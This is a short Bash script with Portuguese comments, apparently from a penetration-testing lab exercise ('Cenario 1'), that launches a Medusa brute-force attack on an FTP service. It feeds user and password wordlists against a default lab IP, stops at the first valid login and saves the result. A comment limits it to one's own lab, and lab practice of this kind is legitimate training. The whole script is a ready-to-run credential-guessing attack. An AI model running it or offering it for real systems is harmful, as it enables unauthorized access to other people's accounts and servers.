#!/usr/bin/env bash
# Cenario 1 - forca bruta no FTP com o Medusa.
# Uso: ./ataque_ftp.sh [ip_do_alvo]
# So rodar em laboratorio proprio.

set -euo pipefail

ALVO="${1:-192.168.56.102}"

echo "[*] Atacando o FTP em ${ALVO}..."

medusa -h "${ALVO}" \
       -U wordlists/users.txt \
       -P wordlists/passwords.txt \
       -M ftp \
       -t 4 \
       -f \
       -O images/ftp_resultado.txt

echo "[+] Pronto. Olha o resultado em images/ftp_resultado.txt"
